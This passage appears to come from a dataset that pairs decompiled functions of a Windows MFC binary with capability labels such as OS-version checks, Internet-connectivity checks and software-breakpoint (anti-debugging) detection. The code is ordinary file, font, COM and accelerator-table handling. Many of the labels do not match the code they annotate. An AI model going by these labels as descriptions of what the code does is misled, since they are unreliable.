param_2;\n            puStack356 = 0x439d72;\n            puStack348 = &stack0xfffffeb8;\n            puStack348 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)();\n            if (puStack348 != 0xffffffff) {\n                puStack352 = 0x439d7e;\n                (*_sym.imp.KERNEL32.dll_FindClose)();\n                if ((puStack348 != NULL) && (param_1 < puStack348)) {\n                    puStack348 = &stack0xfffffee4;\n                    puStack352 = 0x439d93;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n                    if (iVar2 + (puStack348 - param_1) < 0x104) {\n                        puStack356 = &stack0xfffffee4;\n                        puStack352 = 0x104 - (puStack348 - param_1);\n                        puStack360 = 0x439dad;\n                        puStack348 = puStack356;\n                        fcn.0042498c();\n                        goto code_r0x00439db0;\n                    }\n                }\ncode_r0x00439d47:\n                puStack348 = 0x439d52;\n                fcn.004010d0();\n                goto code_r0x00439dbe;\n            }\n        }\n    }\ncode_r0x00439db0:\n    puStack348 = 0x439dbb;\n    fcn.004010d0();\ncode_r0x00439dbe:\n    *in_FS_OFFSET = uStack340;\n    puStack332 = 0x439dd9;\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 1124
    },
    "00439ec5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00439ec5(int32_t param_1, int32_t param_2, uint32_t param_3, uint param_4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint in_stack_fffffedc;\n    uint uStack276;\n    uchar auStack268 [104];\n    uchar auStack164 [156];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack164;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0xffffffff;\n    fcn.004016d0();\n    if (((param_2 == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_2),  0x103 < iVar2)) ||\n       (iVar2 = param_2,  iVar3 = fcn.00439c6c(),  iVar3 == 0)) goto code_r0x0043a042;\n    fcn.00402280(auStack268);\n    uVar4 = param_3 & 3;\n    uStack276 = 0;\n    if (uVar4 == 0) {\n        uStack276 = 0x80000000;\n    }\n    else if (uVar4 == 1) {\n        uStack276 = 0x40000000;\n    }\n    else if (uVar4 == 2) {\n        uStack276 = 0xc0000000;\n    }\n    uVar4 = param_3 & 0x70;\n    uVar5 = 1;\n    if ((uVar4 == 0) || (uVar4 == 0x10)) {\ncode_r0x00439fa2:\n        uVar5 = 0;\n    }\n    else if (uVar4 != 0x20) {\n        if (uVar4 == 0x30) {\n            uVar5 = 2;\n        }\n        else {\n            uVar5 = 3;\n            if (uVar4 != 0x40) goto code_r0x00439fa2;\n        }\n    }\n    in_stack_fffffedc = 0xc;\n    if ((param_3 & 0x1000) == 0) {\n        cVar1 = '\\x03';\n    }\n    else {\n        cVar1 = (-((param_3 & 0x2000) != 0) & 2U) + 2;\n    }\n    uVar4 = 0x80;\n    if ((param_3 & 0x10000) != 0) {\n        uVar4 = 0x20000080;\n    }\n    if ((param_3 & 0x20000) != 0) {\n        uVar4 = uVar4 | 0x80000000;\n    }\n    if ((param_3 & 0x40000) != 0) {\n        uVar4 = uVar4 | 0x10000000;\n    }\n    if ((param_3 & 0x80000) != 0) {\n        uVar4 = uVar4 | 0x8000000;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_2, uStack276, uVar5, &stack0xfffffedc, cVar1, uVar4, 0);\n    if (iVar3 == -1) {\n        fcn.00439c41(iVar2, param_2, param_4);\n    }\n    else {\n        *(param_1 + 4) = iVar3;\n        *(param_1 + 8) = 1;\n    }\ncode_r0x0043a042:\n    fcn.004566a8(in_stack_fffffedc);\n    return;\n}\n",
        "token_count": 856
    },
    "0043a4ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043a4ae(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    int16_t iVar5;\n    bool bVar6;\n    \n    bVar6 = *(arg_8h + 2) == -1;\n    iVar1 = fcn.0043a463(arg_8h);\n    iVar2 = fcn.0043a3f7(arg_8h);\n    if (iVar2 != 0) {\n        iVar1 = iVar1 + (bVar6 * 2 + 1) * 2;\n        iVar2 = fcn.00458ff6(iVar1);\n        iVar1 = iVar1 + 2 + iVar2 * 2;\n    }\n    if (bVar6) {\n        iVar5 = *(arg_8h + 0x10);\n    }\n    else {\n        iVar5 = *(arg_8h + 8);\n    }\n    if (iVar5 != 0) {\n        do {\n            puVar3 = (iVar1 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            if (*puVar3 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                do {\n                    uVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                } while (uVar4 != 0);\n            }\n            if (*puVar3 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                do {\n                    uVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                } while (uVar4 != 0);\n            }\n            uVar4 = *puVar3;\n            if ((uVar4 != 0) && (!bVar6)) {\n                uVar4 = uVar4 - 2;\n            }\n            iVar5 = iVar5 + -1;\n            iVar1 = puVar3 + uVar4 + 2;\n        } while (iVar5 != 0);\n    }\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 497
    },
    "0043a7b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid __cdecl fcn.0043a7b3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint32_t uVar6;\n    uint *in_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    ulong uVar13;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpString;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    if (in_ECX[1] != 0) {\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        bVar12 = *(puVar2 + 2) == -1;\n        iVar3 = fcn.0043a3f7(puVar2);\n        iVar1 = bVar12 * 2 + 1;\n        var_58h = iVar1 * 2;\n        if (bVar12) {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        else {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n        if (iVar4 < 0x20) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, arg_8h, 0xffffffff, &var_44h, 0x20);\n            iVar4 = var_58h + iVar4 * 2;\n            if (var_58h <= iVar4) {\n                uVar13 = fcn.0043a463(puVar2);\n                puVar5 = uVar13;\n                iVar7 = 0;\n                iVar10 = uVar13 >> 0x20;\n                if (iVar3 != 0) {\n                    iVar3 = fcn.00458ff6(puVar5 + iVar1);\n                    iVar7 = var_58h + 2 + iVar3 * 2;\n                    iVar10 = iVar4;\n                }\n                uVar6 = iVar7 + 3 + puVar5 & 0xfffffffc;\n                uVar11 = puVar5 + iVar10 + 3 & 0xfffffffc;\n                if (bVar12) {\n                    iVar9 = *(puVar2 + 4);\n                }\n                else {\n                    iVar9 = *(puVar2 + 2);\n                }\n                if ((iVar4 != iVar7) && (iVar9 != 0)) {\n                    uVar8 = (in_ECX[1] - uVar6) + puVar2;\n                    if (in_ECX[1] < uVar8) goto code_r0x0043a8f3;\n                    fcn.0040e880(uVar11, uVar8, uVar6, uVar8);\n                }\n                *puVar5 = arg_ch;\n                iVar4 = iVar4 + iVar1 * -2;\n                fcn.0040e880(puVar5 + iVar1, iVar4, &var_44h, iVar4);\n                in_ECX[1] = in_ECX[1] + (uVar11 - uVar6);\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*in_ECX);\n                in_ECX[2] = 0;\n            }\n        }\n    }\ncode_r0x0043a8f3:\n    fcn.004566a8(var_58h);\n    return;\n}\n",
        "token_count": 872
    },
    "0043a902": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a902(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *arg_8h_00;\n    uint unaff_EDI;\n    uint32_t uVar5;\n    uint var_44h;\n    int32_t lpvObject;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    uVar5 = 10;\n    arg_8h_00 = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x0043a97e;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        arg_8h_00 = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar5 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        uVar5 = uVar5 & 0xffff;\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x0043a97e:\n    if (arg_8h == 0) {\n        arg_8h = uVar5;\n    }\n    fcn.0043a7b3(arg_8h_00, arg_8h);\n    fcn.004566a8(unaff_EDI);\n    return;\n}\n",
        "token_count": 479
    },
    "0043b5c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0043b5c4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0x10);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    piVar4 = *(extraout_ECX + 0x20);\n    *(unaff_EBP + -0x14) = 0;\n    iVar1 = *piVar4;\n    *(unaff_EBP + -4) = 0;\n    iVar1 = (**(iVar1 + 0x128))(extraout_ECX, unaff_EBP + -0x14, *(unaff_EBP + 0x24), *(unaff_EBP + 0xc));\n    if ((iVar1 != 0) && (*(unaff_EBP + -0x14) == 0)) {\n        iVar1 = fcn.0042b7b9();\n        if (*(iVar1 + 0x3c) == 0) {\n            fcn.0041901a();\n        }\n        iVar1 = fcn.0042b7b9();\n        uVar2 = (**(**(iVar1 + 0x3c) + 0xc))(extraout_ECX, *(unaff_EBP + 0x10));\n        *(unaff_EBP + -0x14) = uVar2;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x14) != NULL) {\n        if (**(unaff_EBP + 0x10) == 2) {\n            iVar1 = (**(**(unaff_EBP + -0x14) + 0x50))\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x14), *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c), *(unaff_EBP + 0x20), *(unaff_EBP + 0x24), *(unaff_EBP + 0x28), \n                               *(unaff_EBP + 0x2c), *(unaff_EBP + 0x30));\n        }\n        else {\n            iVar1 = fcn.0043c8f7(*(unaff_EBP + 8), *(unaff_EBP + 0x10), *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), \n                                 *(unaff_EBP + 0x20), *(unaff_EBP + 0x24));\n        }\n        *(unaff_EBP + 0x24) = -1 < iVar1;\n        if (-1 < iVar1 == 0) {\n            if (*(unaff_EBP + -0x14) != NULL) {\n                (**(**(unaff_EBP + -0x14) + 4))(1);\n            }\n        }\n        else {\n            puVar3 = fcn.004170b4(0xc);\n            if (puVar3 == NULL) {\n                puVar3 = NULL;\n            }\n            else {\n                uVar2 = *(unaff_EBP + -0x14);\n                *puVar3 = 0;\n                puVar3[1] = uVar2;\n                puVar3[2] = 0;\n            }\n            fcn.00432501(puVar3);\n            iVar1 = *(unaff_EBP + -0x14);\n            if (*(iVar1 + 0x24) != 0) {\n                piVar4 = fcn.0043194f(*(iVar1 + 0x24));\n                *piVar4 = iVar1;\n                iVar1 = *(unaff_EBP + -0x14);\n            }\n            if (*(unaff_EBP + 0x34) != NULL) {\n                **(unaff_EBP + 0x34) = iVar1;\n            }\n        }\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 1060
    },
    "0043b971": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043b971(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpModuleName;\n    uint var_4h;\n    int32_t iVar4;\n    \n    iVar4 = 0x20;\n    fcn.00458eae(0x20);\n    *(unaff_EBP + -0x2c) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlContainer.0;\n    pcVar3 = extraout_ECX[0x11];\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x24) = pcVar3;\n    while (pcVar3 != NULL) {\n        *(unaff_EBP + -0x28) = pcVar3;\n        iVar4 = unaff_EBP + -0x24;\n        piVar1 = fcn.0041c771();\n        iVar2 = *piVar1;\n        if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (*(*(iVar2 + 4) + 0x90) == 0)) {\n            iVar4 = *(unaff_EBP + -0x28);\n            fcn.004323cd();\n            fcn.0043affb();\n            fcn.004170df(iVar2);\n        }\n        pcVar3 = *(unaff_EBP + -0x24);\n    }\n    pcVar3 = extraout_ECX[0x13];\n    while (pcVar3 != NULL) {\n        iVar2 = fcn.00432378(iVar4);\n        if (iVar2 != 0) {\n            fcn.0043affb();\n            fcn.004170df(iVar2);\n        }\n        pcVar3 = extraout_ECX[0x13];\n    }\n    fcn.00431721();\n    fcn.00430b55(extraout_ECX + 0x19);\n    *(unaff_EBP + -0x20) = 0;\n    iVar4 = fcn.00430d5c(0x4965a4, unaff_EBP + -0x20);\n    if (-1 < iVar4) {\n        *(unaff_EBP + -0x1c) = str.mfcm80.dll._0_4_;\n        *(unaff_EBP + -0x18) = str.mfcm80.dll._4_4_;\n        *(unaff_EBP + -0x14) = str.mfcm80.dll._8_2_;\n        *(unaff_EBP + -0x12) = str.mfcm80.dll[10];\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(unaff_EBP + -0x1c);\n        if ((iVar4 != 0) &&\n           (pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, \"MFCM80ReleaseManagedReferences\"),  pcVar3 != NULL))\n        {\n            (*pcVar3)(*(unaff_EBP + -0x20));\n        }\n        (**(**(unaff_EBP + -0x20) + 8))(*(unaff_EBP + -0x20));\n    }\n    *(unaff_EBP + -4) = 1;\n    fcn.00432473();\n    *(unaff_EBP + -4) = 0;\n    fcn.004318f6();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004220a2();\n    fcn.00458f31();\n    return;\n}\n",
        "token_count": 855
    },
    "0043bbdb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bbdb(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    var_4h = *(in_ECX + 0x44);\n    while (var_4h != 0) {\n        piVar1 = fcn.0041c771(&var_4h);\n        if (*(*piVar1 + 4) != 0) {\n            fcn.0043cdf3(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0043c542": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043c542(uint arg_8h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = 0;\n    *(unaff_EBP + -4) = 0;\n    iVar1 = *(unaff_EBP + 8) * 8;\n    iVar2 = fcn.004170b4(-(iVar1 >> 0x20 != 0) | iVar1);\n    *extraout_ECX = iVar2;\n    if (*extraout_ECX != 0) {\n        extraout_ECX[1] = *(unaff_EBP + 8);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 236
    },
    "0043c682": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0043c682(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*(param_1 + 0x1c) == '\\0') {\n        iVar1 = *(*(param_1 + 0x14) + 8);\n        in_EAX = *param_2;\n        if (in_EAX <= *(param_1 + 0xc) + -1 + iVar1) {\n            in_EAX = in_EAX - iVar1;\n            *param_2 = in_EAX;\ncode_r0x0043c6ce:\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(param_1 + 0xc) != 0) {\n            in_EAX = *param_2;\n            puVar2 = *(param_1 + 0x14) + 8;\n            do {\n                if (*puVar2 == in_EAX) {\n                    *param_2 = uVar3;\n                    goto code_r0x0043c6ce;\n                }\n                uVar3 = uVar3 + 1;\n                puVar2 = puVar2 + 0xc;\n            } while (uVar3 < *(param_1 + 0xc));\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 337
    },
    "0043ca52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ca52(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((*(in_ECX + 0x50) != 0) && (iVar1 = (****(in_ECX + 0x50))(*(in_ECX + 0x50), 0x4967e4, &var_8h),  -1 < iVar1)) {\n        var_4h = NULL;\n        var_ch = 0;\n        iVar1 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n        if (-1 < iVar1) {\n            (**(*var_4h + 0x14))(var_4h, arg_ch, &var_ch);\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_8h + 8))(var_8h);\n        return var_ch;\n    }\n    return 0;\n}\n",
        "token_count": 257
    },
    "0043cabc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cabc(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((arg_ch != 0) && (in_ECX[0x14] != 0)) {\n        var_8h = in_ECX;\n        iVar1 = (***in_ECX[0x14])(in_ECX[0x14], 0x4967e4, &var_8h);\n        if (-1 < iVar1) {\n            var_4h = NULL;\n            iVar1 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n            if (-1 < iVar1) {\n                (**(*var_4h + 0x18))(var_4h, arg_ch);\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0043cb1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0043cb1c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    *arg_8h = *0x495414;\n    arg_8h[1] = *0x495418;\n    arg_8h[2] = *0x49541c;\n    arg_8h[3] = *0x495420;\n    var_ch = NULL;\n    iVar1 = (****(in_ECX + 0x50))(*(in_ECX + 0x50), 0x4967b4, &var_ch);\n    if (-1 < iVar1) {\n        (**(*var_ch + 0x10))(var_ch, 1, arg_8h);\n        (**(*var_ch + 8))(var_ch);\n    }\n    var_14h = NULL;\n    iVar1 = fcn.00421c9c(arg_8h, 0x495414);\n    if ((iVar1 != 0) && (iVar1 = (****(in_ECX + 0x50))(*(in_ECX + 0x50), 0x4967c4, &var_14h),  -1 < iVar1)) {\n        var_4h = NULL;\n        iVar1 = (**(*var_14h + 0xc))(var_14h, &var_4h);\n        if (-1 < iVar1) {\n            iVar1 = (**(*var_4h + 0xc))(var_4h, &var_10h);\n            if (-1 < iVar1) {\n                uVar2 = 0;\n                if (*(var_10h + 0x30) != 0) {\n                    do {\n                        iVar1 = (**(*var_4h + 0x24))(var_4h, uVar2, &var_1ch);\n                        if ((-1 < iVar1) && ((var_1ch & 7) == 3)) {\n                            var_8h = NULL;\n                            iVar1 = (**(*var_4h + 0x20))(var_4h, uVar2, &var_20h);\n                            if ((-1 < iVar1) && (iVar1 = (**(*var_4h + 0x38))(var_4h, var_20h, &var_8h),  -1 < iVar1)) {\n                                iVar1 = (**(*var_8h + 0xc))(var_8h, &var_18h);\n                                if (-1 < iVar1) {\n                                    *arg_8h = *var_18h;\n                                    arg_8h[1] = var_18h[1];\n                                    arg_8h[2] = var_18h[2];\n                                    arg_8h[3] = var_18h[3];\n                                    (**(*var_8h + 0x4c))(var_8h, var_18h);\n                                }\n                                (**(*var_8h + 8))(var_8h);\n                            }\n                            break;\n                        }\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < *(var_10h + 0x30));\n                }\n                (**(*var_4h + 0x4c))(var_4h, var_10h);\n            }\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_14h + 8))(var_14h);\n    }\n    iVar1 = fcn.00421c9c(arg_8h, 0x495414);\n    return iVar1 == 0;\n}\n",
        "token_count": 873
    },
    "0043cce6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043cce6(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    if ((*(in_ECX + 0x80) == 0) || (*(in_ECX + 0x7c) == 0)) {\n        var_4h = 0;\n    }\n    else {\n        puVar1 = fcn.004170b4(*(in_ECX + 0x80) * 6);\n        iVar2 = (*_sym.imp.USER32.dll_CopyAcceleratorTableA)(*(in_ECX + 0x7c), puVar1, *(in_ECX + 0x80));\n        var_4h = 0;\n        iVar5 = 0;\n        puVar3 = puVar1;\n        if (0 < iVar2) {\n            do {\n                if (arg_8h == 0) {\n                    fcn.0041901a();\ncode_r0x0043cd7e:\n                    var_4h = 1;\n                    break;\n                }\n                if (*(arg_8h + 4) == 0x106) {\n                    uVar4 = 0x10;\n                }\n                else {\n                    uVar4 = 0;\n                }\n                if (((*puVar3 & 0xfd) == uVar4) && (*(puVar3 + 2) == *(arg_8h + 8))) goto code_r0x0043cd7e;\n                iVar5 = iVar5 + 1;\n                puVar3 = puVar3 + 6;\n            } while (iVar5 < iVar2);\n        }\n        fcn.004170df(puVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 420
    },
    "0043cd9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cd9a(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    if ((*(in_ECX + 0x1c) & 0x4000) == 0) {\n        (**(*in_ECX + 0xb0))();\n    }\n    var_4h = NULL;\n    if (in_ECX[0x14] != 0) goto code_r0x0043cdc0;\n    while( true ) {\n        fcn.0041901a();\ncode_r0x0043cdc0:\n        piVar1 = in_ECX + 0x14;\n        in_ECX = &var_4h;\n        iVar2 = (****piVar1)(*piVar1, 0x496794);\n        if (iVar2 < 0) break;\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x10))(var_4h, arg_8h);\n            (**(*var_4h + 8))(var_4h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0043cdf3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cdf3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (in_ECX[0x14] != 0) goto code_r0x0043ce02;\n    while( true ) {\n        fcn.0041901a();\n        in_ECX = extraout_ECX;\ncode_r0x0043ce02:\n        var_4h = NULL;\n        iVar1 = (***in_ECX[0x14])(in_ECX[0x14], 0x496794, &var_4h);\n        if (iVar1 < 0) break;\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x18))(var_4h, arg_8h);\n            (**(*var_4h + 8))(var_4h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "0043ce7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
